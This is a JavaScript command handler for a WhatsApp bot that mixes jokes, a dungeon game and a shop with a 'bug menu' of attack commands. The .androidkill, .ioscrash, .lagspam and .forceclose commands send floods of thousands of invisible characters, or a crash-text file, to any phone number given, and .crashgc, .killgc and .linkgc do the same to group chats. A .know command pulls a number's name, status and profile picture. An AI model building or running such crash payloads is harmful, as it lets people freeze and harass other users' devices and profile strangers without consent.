const fs = require('fs');

global.antibugOn = true;
global.mirrorMode = false;
global.mirrorTarget = null;

let users = JSON.parse(fs.readFileSync('./data/users.json'));
let shop = JSON.parse(fs.readFileSync('./data/shop.json'));

module.exports = async function (sock, m, msg, sender, reply) {
  const args = msg.trim().split(' ');
  const command = args[0].toLowerCase();

  if (global.antibugOn && m.message?.conversation) {
    const crashPattern = /[\u200B-\u200D\uFEFF\u2060]{100,}/;
    if (crashPattern.test(m.message.conversation)) {
      await sock.sendMessage(m.chat, { text: '🛡️ AntiBug triggered.' });
      return;
    }
  }

  if (global.mirrorMode && sender === global.mirrorTarget && m.message?.conversation) {
    await sock.sendMessage(m.chat, { text: m.message.conversation });
  }

  if (!users[sender]) {
    users[sender] = { level: 1, hp: 100, inventory: [], alive: true };
    fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
  }

  const player = users[sender];

  switch (command) {
    case '.menu':
      reply('📜 Menu:\n.bugmenu\n.shadow\n.joke\n.quote\n.love\n.fakecrash\n.tagall\n.know <number>\n.mirrorchat\n.stopmirror');
      break;

    case '.bugmenu':
      reply('🧨 Bug Menu:\n.fakecrash\n.invisiblecrash\n.lagspam <number>\n.forceclose <number>\n.crashgc\n.killgc\n.linkgc\n.androidkill <number>\n.ioscrash <number>\n.antibug on/off');
      break;

    case '.joke':
      reply('😂 Why do hackers love dark mode? Because light attracts bugs.');
      break;

    case '.quote':
      reply('💬 "The quieter you become, the more you can hear." – TerminalX');
      break;

    case '.love':
      reply('❤️ I’d root for you any day.');
      break;

    case '.fakecrash':
      try {
        const txt = fs.readFileSync('./media/crash.txt', 'utf-8');
        await sock.sendMessage(sender, { text: txt }, { quoted: m });
      } catch {
        reply('⚠️ Missing file: ./media/crash.txt');
      }
      break;

    case '.invisiblecrash':
      reply('‎'.repeat(3000));
      break;

    case '.androidkill':
    case '.ioscrash':
      const crashTarget = args[1];
      if (!crashTarget) return reply('⚠️ Usage: .androidkill <number>');
      for (let i = 0; i < 4; i++) {
        await sock.sendMessage(`${crashTarget}@s.whatsapp.net`, { text: '‎'.repeat(2000) });
      }
      reply(`💥 Sent payload to ${crashTarget}`);
      break;

    case '.lagspam':
      const lagTarget = args[1];
      if (!lagTarget) return reply('⚠️ Usage: .lagspam <number>');
      for (let i = 0; i < 5; i++) {
        await sock.sendMessage(`${lagTarget}@s.whatsapp.net`, { text: '‎'.repeat(1500) });
      }
      reply(`📡 Sent lagspam to ${lagTarget}`);
      break;

    case '.forceclose':
      const target = args[1];
      if (!target) return reply('⚠️ Usage: .forceclose <number>');
      try {
        const txt = fs.readFileSync('./media/crash.txt', 'utf-8');
        await sock.sendMessage(`${target}@s.whatsapp.net`, { text: txt });
        reply('☠️ Force close attempt sent.');
      } catch {
        reply('⚠️ Missing file: ./media/crash.txt');
      }
      break;

    case '.tagall':
      if (!m.isGroup) return reply('🚫 Group only.');
      const metadata = await sock.groupMetadata(m.chat);
      const ids = metadata.participants.map(p => p.id);
      await sock.sendMessage(m.chat, {
        text: ids.map(x => `@${x.split('@')[0]}`).join(' '),
        mentions: ids
      });
      break;

    case '.know':
      const num = args[1];
      if (!num) return reply('Usage: .know <number>');
      const jid = `${num}@s.whatsapp.net`;
      try {
        const exists = await sock.onWhatsApp(num);
        const pp = await sock.profilePictureUrl(jid).catch(() => 'Not available');
        const status = await sock.fetchStatus(jid).catch(() => ({ status: 'Not available' }));
        const name = exists[0]?.notify || 'Unknown';
        reply(`👤 Name: ${name}\n🟢 Exists: ${exists[0]?.exists ? 'Yes' : 'No'}\n📝 Status: ${status.status}\n🖼️ Pic: ${pp}`);
      } catch {
        reply('Failed to fetch user info.');
      }
      break;

    case '.mirrorchat':
      global.mirrorMode = true;
      global.mirrorTarget = sender;
      reply('🔁 Mirror ON.');
      break;

    case '.stopmirror':
      global.mirrorMode = false;
      global.mirrorTarget = null;
      reply('🛑 Mirror OFF.');
      break;

    case '.joinlink':
      const link = args[1];
      if (!link) return reply('Usage: .joinlink <link>');
      const invite = link.split('https://chat.whatsapp.com/')[1];
      await sock.groupAcceptInvite(invite).then(() => {
        reply('✅ Joined group.');
      }).catch(() => {
        reply('❌ Failed to join.');
      });
      break;

    case '.crashgc':
    case '.killgc':
      if (!m.isGroup) return reply('⚠️ Group only.');
      const payload = '‎'.repeat(3000);
      await sock.sendMessage(m.chat, { text: payload });
      reply('💣 GC crash attempt sent.');
      break;

    case '.linkgc':
      if (!m.isGroup) return reply('⚠️ Group only.');
      const code = await sock.groupInviteCode(m.chat);
      const blast = 'https://chat.whatsapp.com/' + code + '\n' + '‎'.repeat(2500);
      await sock.sendMessage(m.chat, { text: blast });
      break;

    case '.antibug':
      const toggle = args[1];
      if (toggle === 'on') {
        global.antibugOn = true;
        reply('✅ AntiBug ON');
      } else if (toggle === 'off') {
        global.antibugOn = false;
        reply('❌ AntiBug OFF');
      } else {
        reply('Usage: .antibug on/off');
      }
      break;

    case '.fight':
      reply(`⚔️ Entered dungeon. Type .attack left or .attack right`);
      break;

    case '.attack':
      const side = args[1];
      if (!player.alive) return reply('☠️ You are dead! Use .revive or .heal');
      if (!['left', 'right'].includes(side)) return reply('⚔️ Use .attack left or right');

      const monster = Math.floor(Math.random() * (player.level * 15 + 50));
      const power = Math.floor(Math.random() * (player.level * 10 + 30));

      if (power >= monster) {
        player.level++;
        fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
        reply(`🎯 You won! Now Level ${player.level}`);
      } else {
        player.hp = 0;
        player.alive = false;
        fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
        reply('💀 You died! Use .revive or .heal');
      }
      break;

    case '.shop':
      const items = Object.keys(shop).map(item => `${item} - ${shop[item].price} coins`).join('\n');
      reply(`🛍️ Shop:\n${items}`);
      break;

    case '.buy':
      const item = args[1];
      if (!item || !shop[item]) return reply('❌ Item not found.');
      player.inventory.push(item);
      fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
      reply(`✅ Purchased ${item}.`);
      break;

    case '.inventory':
      reply(`🎒 Inventory: ${player.inventory.join(', ') || 'Empty'}`);
      break;

    case '.revive':
      if (player.alive) return reply('🧬 You are already alive.');
      player.alive = true;
      player.hp = 100;
      fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
      reply('✨ You have revived!');
      break;

    case '.heal':
      if (!player.alive) return reply('☠️ Use .revive first.');
      player.hp = 100;
      fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
      reply('💉 Health restored.');
      break;
  }
};
